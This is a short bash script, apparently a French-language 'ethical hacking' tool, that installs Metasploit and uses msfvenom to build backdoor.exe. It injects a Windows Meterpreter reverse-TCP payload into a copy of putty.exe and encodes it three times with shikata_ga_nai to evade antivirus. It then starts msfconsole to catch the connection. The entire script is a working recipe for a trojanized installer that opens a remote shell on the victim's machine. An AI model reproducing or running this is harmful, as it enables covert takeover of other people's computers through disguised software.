#!/bin/bash
echo "***********************************************************"
echo "*                   Ethical Hacking                       *"
echo "*                      BACKDOOR                           *"
echo "*                      Samglish                           *"
echo "***********************************************************"

echo "Installing tools..."
echo "------------------------------------------------------------"
echo "***Metasploit-framework***"
echo "Please wait..."
sudo apt install metasploit-framework
echo " "
echo " Voulez vous creer votre backdoor?"
echo " 1. Oui"
echo " 2. Non"
read -p "Choix : " choix
if [ $choix -eq 1 ];
then

read -p "votre adresse ip : " ip

msfvenom -a x86 -x /home/samglish/Téléchargements/putty.exe -k -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=3232 -e x86/shikata_ga_nai -i 3 -b "\x00" f exe -o backdoor.exe

echo "backdoor.exe created"

echo "nous lancons l'exploit"

msfconsole

echo "pour plus de details voulez-vous telecharger mon projet sur github"

git clone https://github.com/samglish/Secu_03/

else

exit

fi
